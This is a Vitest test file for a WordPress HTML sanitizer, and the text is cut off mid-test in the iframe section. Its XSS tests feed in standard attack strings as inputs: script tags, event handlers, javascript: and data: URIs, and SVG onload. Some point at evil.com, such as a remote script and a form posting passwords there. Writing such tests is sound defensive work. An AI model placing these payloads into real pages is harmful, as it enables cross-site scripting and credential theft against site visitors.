/**
 * Comprehensive Test Suite for WordPress HTML Sanitization
 *
 * This test suite validates the security and functionality of the
 * sanitizeWordPressHtml function. Tests cover XSS prevention,
 * content preservation, edge cases, and external link detection.
 *
 * @module lib/wordpress/sanitize.test
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { sanitizeWordPressHtml, sanitizeBlockHtml } from './sanitize';

/**
 * Helper function to normalize HTML for comparison.
 * Removes extra whitespace and normalizes quotes for consistent testing.
 *
 * @param html - The HTML string to normalize
 * @returns Normalized HTML string
 */
function normalizeHtml(html: string): string {
  return html
    .replace(/\s+/g, ' ')
    .replace(/> </g, '><')
    .trim();
}

describe('sanitizeWordPressHtml', () => {
  // ============================================================
  // XSS PREVENTION TESTS
  // These tests verify that common XSS attack vectors are blocked
  // ============================================================

  describe('XSS Prevention', () => {
    describe('Script Tag Attacks', () => {
      it('should remove inline script tags', () => {
        const malicious = '<p>Hello</p><script>alert("XSS")</script><p>World</p>';
        const result = sanitizeWordPressHtml(malicious);
        expect(result).not.toContain('<script');
        expect(result).not.toContain('</script>');
        expect(result).not.toContain('alert');
        expect(result).toContain('Hello');
        expect(result).toContain('World');
      });

      it('should remove script tags with src attribute', () => {
        const malicious = '<script src="https://evil.com/xss.js"></script>';
        const result = sanitizeWordPressHtml(malicious);
        expect(result).not.toContain('<script');
        expect(result).not.toContain('evil.com');
      });

      it('should remove script tags with type attribute', () => {
        const malicious = '<script type="text/javascript">document.cookie</script>';
        const result = sanitizeWordPressHtml(malicious);
        expect(result).not.toContain('<script');
        expect(result).not.toContain('document.cookie');
      });

      it('should handle script tags with unusual casing', () => {
        const malicious = '<ScRiPt>alert(1)</sCrIpT>';
        const result = sanitizeWordPressHtml(malicious);
        expect(result.toLowerCase()).not.toContain('<script');
      });

      it('should handle script tags with extra whitespace', () => {
        const malicious = '<script   >alert(1)</script  >';
        const result = sanitizeWordPressHtml(malicious);
        expect(result).not.toContain('<script');
      });
    });

    describe('Event Handler Attacks', () => {
      it('should remove onclick handler', () => {
        const malicious = '<a href="#" onclick="alert(1)">Click me</a>';
        const result = sanitizeWordPressHtml(malicious);
        expect(result).not.toContain('onclick');
        expect(result).toContain('Click me');
      });

      it('should remove onerror handler on images', () => {
        const malicious = '<img src="x" onerror="alert(1)">';
        const result = sanitizeWordPressHtml(malicious);
        expect(result).not.toContain('onerror');
      });

      it('should remove onload handler', () => {
        const malicious = '<body onload="alert(1)"><p>Content</p></body>';
        const result = sanitizeWordPressHtml(malicious);
        expect(result).not.toContain('onload');
      });

      it('should remove onmouseover handler', () => {
        const malicious = '<div onmouseover="alert(1)">Hover me</div>';
        const result = sanitizeWordPressHtml(malicious);
        expect(result).not.toContain('onmouseover');
        expect(result).toContain('Hover me');
      });

      it('should remove onfocus handler', () => {
        const malicious = '<input onfocus="alert(1)" autofocus>';
        const result = sanitizeWordPressHtml(malicious);
        expect(result).not.toContain('onfocus');
      });

      it('should remove onsubmit handler', () => {
        const malicious = '<form onsubmit="alert(1)"><input></form>';
        const result = sanitizeWordPressHtml(malicious);
        expect(result).not.toContain('onsubmit');
      });

      it('should remove multiple event handlers from same element', () => {
        const malicious = '<div onclick="a()" onmouseover="b()" onmouseout="c()">Text</div>';
        const result = sanitizeWordPressHtml(malicious);
        expect(result).not.toContain('onclick');
        expect(result).not.toContain('onmouseover');
        expect(result).not.toContain('onmouseout');
      });
    });

    describe('javascript: Protocol Attacks', () => {
      it('should remove javascript: protocol in href', () => {
        const malicious = '<a href="javascript:alert(1)">Click me</a>';
        const result = sanitizeWordPressHtml(malicious);
        expect(result).not.toContain('javascript:');
        expect(result).toContain('Click me');
      });

      it('should remove javascript: protocol with encoding', () => {
        const malicious = '<a href="javascript&#58;alert(1)">Click</a>';
        const result = sanitizeWordPressHtml(malicious);
        expect(result).not.toContain('javascript');
        expect(result).not.toContain('alert(1)');
      });

      it('should remove javascript: protocol with mixed case', () => {
        const malicious = '<a href="JaVaScRiPt:alert(1)">Click</a>';
        const result = sanitizeWordPressHtml(malicious);
        expect(result.toLowerCase()).not.toContain('javascript:');
      });

      it('should remove javascript: protocol with leading whitespace', () => {
        const malicious = '<a href="   javascript:alert(1)">Click</a>';
        const result = sanitizeWordPressHtml(malicious);
        expect(result).not.toContain('javascript:');
      });

      it('should remove javascript: protocol in img src', () => {
        const malicious = '<img src="javascript:alert(1)">';
        const result = sanitizeWordPressHtml(malicious);
        expect(result).not.toContain('javascript:');
      });
    });

    describe('data: URI Attacks', () => {
      it('should remove data: URI in anchor href', () => {
        const malicious = '<a href="data:text/html,<script>alert(1)</script>">Click</a>';
        const result = sanitizeWordPressHtml(malicious);
        expect(result).not.toContain('data:');
        expect(result).not.toContain('<script');
      });

      it('should remove data: URI in img src', () => {
        const malicious = '<img src="data:text/html,<script>alert(1)</script>">';
        const result = sanitizeWordPressHtml(malicious);
        expect(result).not.toContain('data:');
      });

      it('should remove data: URI with base64 encoding', () => {
        const malicious = '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">';
        const result = sanitizeWordPressHtml(malicious);
        expect(result).not.toContain('data:');
      });
    });

    describe('Style-based Attacks', () => {
      it('should remove style tags', () => {
        const malicious = '<style>body { background: url("javascript:alert(1)") }</style>';
        const result = sanitizeWordPressHtml(malicious);
        expect(result).not.toContain('<style');
        expect(result).not.toContain('javascript:');
      });

      it('should remove expression in style attribute (IE legacy attack)', () => {
        const malicious = '<div style="width: expression(alert(1))">Content</div>';
        const result = sanitizeWordPressHtml(malicious);
        // Style attributes are not in allowed attributes, so they should be removed
        expect(result).not.toContain('expression');
      });
    });

    describe('SVG-based Attacks', () => {
      it('should not allow SVG with script', () => {
        const malicious = '<svg><script>alert(1)</script></svg>';
        const result = sanitizeWordPressHtml(malicious);
        expect(result).not.toContain('<script');
        expect(result).not.toContain('alert');
      });

      it('should not allow SVG with onload', () => {
        const malicious = '<svg onload="alert(1)"></svg>';
        const result = sanitizeWordPressHtml(malicious);
        expect(result).not.toContain('onload');
      });
    });

    describe('Form and Input Attacks', () => {
      it('should remove form tags', () => {
        const malicious = '<form action="https://evil.com/steal"><input name="password"></form>';
        const result = sanitizeWordPressHtml(malicious);
        expect(result).not.toContain('<form');
        expect(result).not.toContain('evil.com');
      });

      it('should remove input tags', () => {
        const malicious = '<input type="hidden" name="csrf" value="token">';
        const result = sanitizeWordPressHtml(malicious);
        expect(result).not.toContain('<input');
      });

      it('should remove button tags', () => {
        const malicious = '<button onclick="stealData()">Submit</button>';
        const result = sanitizeWordPressHtml(malicious);
        expect(result).not.toContain('<button');
      });
    });

    describe('Object and Embed Attacks', () => {
      it('should remove object tags', () => {
        const malicious = '<object data="https://evil.com/malware.swf"></object>';
        const result = sanitizeWordPressHtml(malicious);
        expect(result).not.toContain('<object');
      });

      it('should remove embed tags', () => {
        const malicious = '<embed src="https://evil.com/malware.swf">';
        const result = sanitizeWordPressHtml(malicious);
        expect(result).not.toContain('<embed');
      });

      it('should remove applet tags', () => {
        const malicious = '<applet code="Malware.class"></applet>';
        const result = sanitizeWordPressHtml(malicious);
        expect(result).not.toContain('<applet');
      });
    });

    describe('Meta and Link Tag Attacks', () => {
      it('should remove meta refresh', () => {
        const malicious = '<meta http-equiv="refresh" content="0;url=https://evil.com">';
        const result = sanitizeWordPressHtml(malicious);
        expect(result).not.toContain('<meta');
      });

      it('should remove link tags', () => {
        const malicious = '<link rel="stylesheet" href="https://evil.com/steal.css">';
        const result = sanitizeWordPressHtml(malicious);
        expect(result).not.toContain('<link');
      });

      it('should remove base tags', () => {
        const malicious = '<base href="https://evil.com/">';
        const result = sanitizeWordPressHtml(malicious);
        expect(result).not.toContain('<base');
      });
    });
  });

  // ============================================================
  // CONTENT PRESERVATION TESTS
  // These tests verify that legitimate WordPress content is preserved
  // ============================================================

  describe('Content Preservation', () => {
    describe('Basic Text Formatting', () => {
      it('should preserve paragraph tags', () => {
        const html = '<p>This is a paragraph.</p>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('<p>');
        expect(result).toContain('</p>');
        expect(result).toContain('This is a paragraph.');
      });

      it('should preserve heading tags', () => {
        const html = '<h1>Title</h1><h2>Subtitle</h2><h3>Section</h3>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('<h1>Title</h1>');
        expect(result).toContain('<h2>Subtitle</h2>');
        expect(result).toContain('<h3>Section</h3>');
      });

      it('should preserve strong and em tags', () => {
        const html = '<p><strong>Bold</strong> and <em>italic</em> text.</p>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('<strong>Bold</strong>');
        expect(result).toContain('<em>italic</em>');
      });

      it('should preserve blockquotes with cite attribute', () => {
        const html = '<blockquote cite="https://example.com/source">A wise quote</blockquote>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('<blockquote');
        expect(result).toContain('cite="https://example.com/source"');
        expect(result).toContain('A wise quote');
      });

      it('should preserve code and pre tags', () => {
        const html = '<pre><code>const x = 1;</code></pre>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('<pre>');
        expect(result).toContain('<code>');
        expect(result).toContain('const x = 1;');
      });
    });

    describe('List Elements', () => {
      it('should preserve unordered lists', () => {
        const html = '<ul><li>Item 1</li><li>Item 2</li></ul>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('<ul>');
        expect(result).toContain('<li>Item 1</li>');
        expect(result).toContain('<li>Item 2</li>');
        expect(result).toContain('</ul>');
      });

      it('should preserve ordered lists with attributes', () => {
        const html = '<ol start="5" reversed type="A"><li value="3">Item</li></ol>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('start="5"');
        expect(result).toContain('reversed');
        expect(result).toContain('value="3"');
      });

      it('should preserve definition lists', () => {
        const html = '<dl><dt>Term</dt><dd>Definition</dd></dl>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('<dl>');
        expect(result).toContain('<dt>Term</dt>');
        expect(result).toContain('<dd>Definition</dd>');
      });
    });

    describe('Images with srcset', () => {
      it('should preserve images with all standard attributes', () => {
        const html = '<img src="photo.jpg" alt="A photo" width="800" height="600" loading="lazy">';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('src="photo.jpg"');
        expect(result).toContain('alt="A photo"');
        expect(result).toContain('width="800"');
        expect(result).toContain('height="600"');
        expect(result).toContain('loading="lazy"');
      });

      it('should preserve images with srcset for responsive images', () => {
        const html = '<img src="photo-800.jpg" srcset="photo-400.jpg 400w, photo-800.jpg 800w, photo-1200.jpg 1200w" sizes="(max-width: 600px) 400px, 800px" alt="Responsive photo">';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('srcset="photo-400.jpg 400w, photo-800.jpg 800w, photo-1200.jpg 1200w"');
        expect(result).toContain('sizes="(max-width: 600px) 400px, 800px"');
      });

      it('should preserve picture element with sources', () => {
        const html = '<picture><source srcset="photo.webp" type="image/webp"><source srcset="photo.jpg" type="image/jpeg"><img src="photo.jpg" alt="Photo"></picture>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('<picture>');
        expect(result).toContain('<source');
        expect(result).toContain('type="image/webp"');
        expect(result).toContain('</picture>');
      });

      it('should preserve figure and figcaption', () => {
        const html = '<figure><img src="photo.jpg" alt="Photo"><figcaption>Photo caption</figcaption></figure>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('<figure>');
        expect(result).toContain('<figcaption>Photo caption</figcaption>');
        expect(result).toContain('</figure>');
      });
    });

    describe('YouTube Embeds', () => {
      it('should preserve YouTube iframes', () => {
        const html = '<iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ" width="560" height="315" title="Video" allow="accelerometer; autoplay; clipboard-write" allowfullscreen></iframe>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('<iframe');
        expect(result).toContain('src="https://www.youtube.com/embed/dQw4w9WgXcQ"');
        expect(result).toContain('width="560"');
        expect(result).toContain('height="315"');
        expect(result).toContain('allowfullscreen');
      });

      it('should preserve YouTube no-cookie domain iframes', () => {
        const html = '<iframe src="https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ"></iframe>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('src="https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ"');
      });

      it('should preserve Vimeo iframes', () => {
        const html = '<iframe src="https://player.vimeo.com/video/123456789" width="640" height="360"></iframe>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('src="https://player.vimeo.com/video/123456789"');
      });

      it('should block iframes from non-allowed domains', () => {
        const html = '<iframe src="https://evil.com/embed"></iframe>';
        const result = sanitizeWordPressHtml(html);
        expect(result).not.toContain('src="https://evil.com/embed"');
        expect(result).toContain('blocked-embed');
      });

      it('should add lazy loading to iframes without it', () => {
        const html = '<iframe src="https://www.youtube.com/embed/abc123"></iframe>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('loading="lazy"');
      });
    });

    describe('Tables', () => {
      it('should preserve complete table structure', () => {
        const html = `
          <table border="1">
            <caption>Table Caption</caption>
            <thead><tr><th scope="col">Header 1</th><th scope="col">Header 2</th></tr></thead>
            <tbody><tr><td>Cell 1</td><td>Cell 2</td></tr></tbody>
            <tfoot><tr><td colspan="2">Footer</td></tr></tfoot>
          </table>
        `;
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('<table');
        expect(result).toContain('<caption>');
        expect(result).toContain('<thead>');
        expect(result).toContain('<tbody>');
        expect(result).toContain('<tfoot>');
        expect(result).toContain('scope="col"');
        expect(result).toContain('colspan="2"');
      });

      it('should preserve table cell attributes', () => {
        const html = '<table><tr><td colspan="2" rowspan="3" headers="h1 h2">Cell</td></tr></table>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('colspan="2"');
        expect(result).toContain('rowspan="3"');
        expect(result).toContain('headers="h1 h2"');
      });

      it('should preserve colgroup and col elements', () => {
        const html = '<table><colgroup><col span="2"><col span="1"></colgroup></table>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('<colgroup>');
        expect(result).toContain('<col');
        expect(result).toContain('span="2"');
      });
    });

    describe('Links', () => {
      it('should preserve internal links', () => {
        const html = '<a href="/about">About Us</a>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('href="/about"');
        expect(result).toContain('About Us');
      });

      it('should preserve external links with https', () => {
        const html = '<a href="https://example.com">Example</a>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('href="https://example.com"');
      });

      it('should preserve mailto links', () => {
        const html = '<a href="mailto:contact@example.com">Email Us</a>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('href="mailto:contact@example.com"');
      });

      it('should preserve tel links', () => {
        const html = '<a href="tel:+1234567890">Call Us</a>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('href="tel:+1234567890"');
      });

      it('should preserve download attribute with filename value', () => {
        // Note: sanitize-html strips boolean attributes without values,
        // so we test the more common pattern of download with a filename
        const html = '<a href="/file.pdf" download="document.pdf">Download PDF</a>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('download="document.pdf"');
      });
    });

    describe('Semantic HTML', () => {
      it('should preserve article and section elements', () => {
        const html = '<article><section><h2>Section Title</h2><p>Content</p></section></article>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('<article>');
        expect(result).toContain('<section>');
      });

      it('should preserve header and footer elements', () => {
        const html = '<header><nav>Navigation</nav></header><main>Content</main><footer>Footer</footer>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('<header>');
        expect(result).toContain('<nav>');
        expect(result).toContain('<main>');
        expect(result).toContain('<footer>');
      });

      it('should preserve aside element', () => {
        const html = '<aside><h3>Sidebar</h3><p>Sidebar content</p></aside>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('<aside>');
      });

      it('should preserve time element with datetime', () => {
        const html = '<time datetime="2024-01-15">January 15, 2024</time>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('<time');
        expect(result).toContain('datetime="2024-01-15"');
      });

      it('should preserve details and summary elements', () => {
        const html = '<details open><summary>Click to expand</summary><p>Hidden content</p></details>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('<details');
        expect(result).toContain('open');
        expect(result).toContain('<summary>');
      });
    });

    describe('Global Attributes', () => {
      it('should preserve class attribute', () => {
        const html = '<div class="wp-block-group has-background">Content</div>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('class="wp-block-group has-background"');
      });

      it('should preserve id attribute', () => {
        const html = '<h2 id="section-1">Section 1</h2>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('id="section-1"');
      });

      it('should preserve aria attributes', () => {
        const html = '<div aria-label="Navigation" aria-hidden="false" role="navigation">Nav</div>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('aria-label="Navigation"');
        expect(result).toContain('aria-hidden="false"');
        expect(result).toContain('role="navigation"');
      });

      it('should preserve data attributes', () => {
        const html = '<div data-custom="value" data-id="123">Content</div>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('data-custom="value"');
        expect(result).toContain('data-id="123"');
      });

      it('should preserve lang and dir attributes', () => {
        const html = '<p lang="ar" dir="rtl">Arabic text</p>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('lang="ar"');
        expect(result).toContain('dir="rtl"');
      });

      it('should preserve title attribute', () => {
        const html = '<abbr title="HyperText Markup Language">HTML</abbr>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('title="HyperText Markup Language"');
      });
    });

    describe('Media Elements', () => {
      it('should preserve video element with all attributes', () => {
        const html = '<video src="video.mp4" poster="poster.jpg" width="640" height="360" controls autoplay loop muted playsinline preload="auto"></video>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('<video');
        expect(result).toContain('poster="poster.jpg"');
        expect(result).toContain('controls');
        expect(result).toContain('autoplay');
        expect(result).toContain('muted');
        expect(result).toContain('playsinline');
      });

      it('should preserve audio element', () => {
        const html = '<audio src="audio.mp3" controls preload="metadata"></audio>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('<audio');
        expect(result).toContain('controls');
        expect(result).toContain('preload="metadata"');
      });

      it('should preserve track element for captions', () => {
        const html = '<video><track src="captions.vtt" kind="captions" srclang="en" label="English" default></video>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('<track');
        expect(result).toContain('kind="captions"');
        expect(result).toContain('srclang="en"');
        expect(result).toContain('default');
      });
    });
  });

  // ============================================================
  // EDGE CASES TESTS
  // These tests verify handling of unusual or boundary conditions
  // ============================================================

  describe('Edge Cases', () => {
    describe('Null and Empty Input', () => {
      it('should return empty string for null input', () => {
        const result = sanitizeWordPressHtml(null);
        expect(result).toBe('');
      });

      it('should return empty string for undefined input', () => {
        const result = sanitizeWordPressHtml(undefined);
        expect(result).toBe('');
      });

      it('should return empty string for empty string input', () => {
        const result = sanitizeWordPressHtml('');
        expect(result).toBe('');
      });

      it('should handle whitespace-only input', () => {
        const result = sanitizeWordPressHtml('   \n\t   ');
        // Whitespace might be preserved or trimmed, but should not throw
        expect(typeof result).toBe('string');
      });
    });

    describe('Malformed HTML', () => {
      it('should handle unclosed tags', () => {
        const html = '<p>Unclosed paragraph<div>Another unclosed';
        // Should not throw and should return sanitized content
        expect(() => sanitizeWordPressHtml(html)).not.toThrow();
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('Unclosed paragraph');
      });

      it('should handle mismatched tags', () => {
        const html = '<p>Start <strong>bold <em>italic</strong> end</em></p>';
        expect(() => sanitizeWordPressHtml(html)).not.toThrow();
      });

      it('should handle extra closing tags', () => {
        const html = '<p>Content</p></p></div>';
        expect(() => sanitizeWordPressHtml(html)).not.toThrow();
      });

      it('should handle nested quotes in attributes', () => {
        const html = '<div class="outer \'inner\' test">Content</div>';
        expect(() => sanitizeWordPressHtml(html)).not.toThrow();
      });

      it('should handle special characters in content', () => {
        const html = '<p>Special chars: < > & " \' &amp; &lt; &gt;</p>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('Special chars');
      });
    });

    describe('Unicode and International Content', () => {
      it('should preserve Unicode characters', () => {
        const html = '<p>Unicode: \u4e2d\u6587 \u0420\u0443\u0441\u0441\u043a\u0438\u0439 \u0639\u0631\u0628\u0649</p>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('\u4e2d\u6587');
        expect(result).toContain('\u0420\u0443\u0441\u0441\u043a\u0438\u0439');
        expect(result).toContain('\u0639\u0631\u0628\u0649');
      });

      it('should preserve emoji', () => {
        const html = '<p>Emoji: \ud83d\ude00 \ud83c\udf89 \ud83d\udcbb \ud83c\udf0d</p>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('\ud83d\ude00');
        expect(result).toContain('\ud83c\udf89');
      });

      it('should preserve HTML entities', () => {
        const html = '<p>&copy; 2024 &mdash; All rights reserved &trade;</p>';
        const result = sanitizeWordPressHtml(html);
        // Entities might be preserved or converted to Unicode
        expect(result).toContain('2024');
      });
    });

    describe('Deeply Nested Content', () => {
      it('should handle deeply nested elements', () => {
        const html = '<div><div><div><div><div><p>Deep content</p></div></div></div></div></div>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('Deep content');
      });

      it('should handle complex nested lists', () => {
        const html = '<ul><li>Level 1<ul><li>Level 2<ul><li>Level 3</li></ul></li></ul></li></ul>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('Level 1');
        expect(result).toContain('Level 2');
        expect(result).toContain('Level 3');
      });
    });

    describe('Large Content', () => {
      it('should handle large HTML content', () => {
        const paragraph = '<p>This is a test paragraph with some content.</p>';
        const largeHtml = paragraph.repeat(1000);
        expect(() => sanitizeWordPressHtml(largeHtml)).not.toThrow();
        const result = sanitizeWordPressHtml(largeHtml);
        expect(result.length).toBeGreaterThan(0);
      });
    });

    describe('Mixed Safe and Unsafe Content', () => {
      it('should preserve safe content while removing unsafe content', () => {
        const html = '<p>Safe content</p><script>alert(1)</script><p>More safe content</p>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('Safe content');
        expect(result).toContain('More safe content');
        expect(result).not.toContain('<script');
        expect(result).not.toContain('alert');
      });

      it('should handle XSS attempt embedded in legitimate content', () => {
        const html = '<p>Welcome <strong onclick="steal()">User</strong>!</p>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('Welcome');
        expect(result).toContain('<strong>');
        expect(result).toContain('User');
        expect(result).not.toContain('onclick');
      });
    });
  });

  // ============================================================
  // EXTERNAL LINK DETECTION TESTS
  // These tests verify proper identification of external vs internal links
  // ============================================================

  describe('External Link Detection', () => {
    // Store original env value to restore after tests
    const originalSiteUrl = process.env.NEXT_PUBLIC_SITE_URL;

    beforeEach(() => {
      // Set a known site URL for testing
      process.env.NEXT_PUBLIC_SITE_URL = 'https://example.com';
    });

    afterEach(() => {
      // Restore original value
      if (originalSiteUrl !== undefined) {
        process.env.NEXT_PUBLIC_SITE_URL = originalSiteUrl;
      } else {
        delete process.env.NEXT_PUBLIC_SITE_URL;
      }
    });

    describe('Internal Links (should NOT have noopener/noreferrer)', () => {
      it('should treat relative path links as internal', () => {
        const html = '<a href="/about">About</a>';
        const result = sanitizeWordPressHtml(html);
        // Internal links should not have rel="noopener noreferrer"
        expect(result).not.toMatch(/rel="[^"]*noopener[^"]*"/);
      });

      it('should treat fragment links as internal', () => {
        const html = '<a href="#section">Jump to section</a>';
        const result = sanitizeWordPressHtml(html);
        expect(result).not.toMatch(/rel="[^"]*noopener[^"]*"/);
      });

      it('should treat same-domain absolute links as internal', () => {
        const html = '<a href="https://example.com/page">Page</a>';
        const result = sanitizeWordPressHtml(html);
        expect(result).not.toMatch(/rel="[^"]*noopener[^"]*"/);
      });

      it('should treat mailto links as internal (not external)', () => {
        const html = '<a href="mailto:test@example.com">Email</a>';
        const result = sanitizeWordPressHtml(html);
        expect(result).not.toMatch(/rel="[^"]*noopener[^"]*"/);
      });

      it('should treat tel links as internal (not external)', () => {
        const html = '<a href="tel:+1234567890">Call</a>';
        const result = sanitizeWordPressHtml(html);
        expect(result).not.toMatch(/rel="[^"]*noopener[^"]*"/);
      });
    });

    describe('External Links (MUST have noopener/noreferrer)', () => {
      it('should add security attributes to target="_blank" links', () => {
        const html = '<a href="/internal" target="_blank">Opens in new tab</a>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('noopener');
        expect(result).toContain('noreferrer');
      });

      it('should add security attributes to different domain links', () => {
        const html = '<a href="https://external.com/page">External</a>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('noopener');
        expect(result).toContain('noreferrer');
      });

      it('should detect subdomain as external', () => {
        const html = '<a href="https://subdomain.external.com">Subdomain</a>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('noopener');
        expect(result).toContain('noreferrer');
      });

      it('should preserve existing rel values while adding security attributes', () => {
        const html = '<a href="https://external.com" rel="nofollow">External</a>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('nofollow');
        expect(result).toContain('noopener');
        expect(result).toContain('noreferrer');
      });
    });

    describe('Bypass Prevention', () => {
      it('should not be fooled by site URL in path', () => {
        // Attack: Attacker creates link with victim's domain as a subdirectory
        const html = '<a href="https://evil.com/example.com/page">Malicious</a>';
        const result = sanitizeWordPressHtml(html);
        // This should be detected as external (evil.com)
        expect(result).toContain('noopener');
        expect(result).toContain('noreferrer');
      });

      it('should not be fooled by site URL in query string', () => {
        // Attack: Attacker includes victim's domain in query parameter
        const html = '<a href="https://evil.com?redirect=example.com">Malicious</a>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('noopener');
        expect(result).toContain('noreferrer');
      });

      it('should not be fooled by site URL in fragment', () => {
        // Attack: Attacker includes victim's domain in URL fragment
        const html = '<a href="https://evil.com#example.com">Malicious</a>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('noopener');
        expect(result).toContain('noreferrer');
      });

      it('should not be fooled by site URL as subdomain of attacker', () => {
        // Attack: example.com.evil.com
        const html = '<a href="https://example.com.evil.com/page">Malicious</a>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('noopener');
        expect(result).toContain('noreferrer');
      });

      it('should not be fooled by protocol-relative URLs to external domains', () => {
        const html = '<a href="//evil.com/page">Protocol-relative</a>';
        const result = sanitizeWordPressHtml(html);
        // Protocol-relative to external domain should be treated as external
        expect(result).toContain('noopener');
        expect(result).toContain('noreferrer');
      });

      it('should handle URLs with username/password', () => {
        // Attack: https://example.com:password@evil.com
        const html = '<a href="https://example.com:password@evil.com/page">Auth bypass</a>';
        const result = sanitizeWordPressHtml(html);
        // The hostname is actually evil.com
        expect(result).toContain('noopener');
        expect(result).toContain('noreferrer');
      });

      it('should handle empty href gracefully', () => {
        const html = '<a href="">Empty href</a>';
        const result = sanitizeWordPressHtml(html);
        // Should not throw and should not add security attributes to empty href
        expect(result).toContain('Empty href');
      });

      it('should handle missing href gracefully', () => {
        const html = '<a>No href</a>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('No href');
      });
    });

    describe('Edge Cases in URL Detection', () => {
      it('should handle localhost when site URL is localhost', () => {
        process.env.NEXT_PUBLIC_SITE_URL = 'http://localhost:3000';
        const html = '<a href="http://localhost:3000/page">Local</a>';
        const result = sanitizeWordPressHtml(html);
        expect(result).not.toMatch(/rel="[^"]*noopener[^"]*"/);
      });

      it('should handle ports in URLs correctly', () => {
        process.env.NEXT_PUBLIC_SITE_URL = 'https://example.com:8080';
        const html = '<a href="https://example.com:8080/page">Same host with port</a>';
        const result = sanitizeWordPressHtml(html);
        expect(result).not.toMatch(/rel="[^"]*noopener[^"]*"/);
      });

      it('should treat different port as internal if same hostname', () => {
        process.env.NEXT_PUBLIC_SITE_URL = 'https://example.com';
        const html = '<a href="https://example.com:8080/page">Same host different port</a>';
        const result = sanitizeWordPressHtml(html);
        // Same hostname should be internal even with different port
        expect(result).not.toMatch(/rel="[^"]*noopener[^"]*"/);
      });

      it('should handle IDN (internationalized domain names)', () => {
        const html = '<a href="https://\u0430\u0431\u0432.com/page">Cyrillic domain</a>';
        const result = sanitizeWordPressHtml(html);
        // Should process without error
        expect(result).toContain('href');
      });

      it('should handle very long URLs', () => {
        const longPath = 'a'.repeat(1000);
        const html = `<a href="https://external.com/${longPath}">Long URL</a>`;
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('noopener');
      });
    });
  });

  // ============================================================
  // IFRAME FILTERING TESTS
  // These tests verify iframe source validation
  // ============================================================

  describe('Iframe Source Filtering', () => {
    describe('Allowed Iframe Sources', () => {
      it('should allow www.youtube.com', () => {
        const html = '<iframe src="https://www.youtube.com/embed/abc123"></iframe>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('src="https://www.youtube.com/embed/abc123"');
        expect(result).not.toContain('blocked-embed');
      });

      it('should allow youtube.com (without www)', () => {
        const html = '<iframe src="https://youtube.com/embed/abc123"></iframe>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('src="https://youtube.com/embed/abc123"');
      });

      it('should allow www.youtube-nocookie.com', () => {
        const html = '<iframe src="https://www.youtube-nocookie.com/embed/abc123"></iframe>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('youtube-nocookie.com');
        expect(result).not.toContain('blocked-embed');
      });

      it('should allow player.vimeo.com', () => {
        const html = '<iframe src="https://player.vimeo.com/video/123456"></iframe>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('player.vimeo.com');
      });

      it('should allow vimeo.com', () => {
        const html = '<iframe src="https://vimeo.com/video/123456"></iframe>';
        const result = sanitizeWordPressHtml(html);
        expect(result).toContain('vimeo.com');
      });
    });

    describe('Blocked Iframe Sources', () => {
      it('should block iframes from unknown domains', () => {
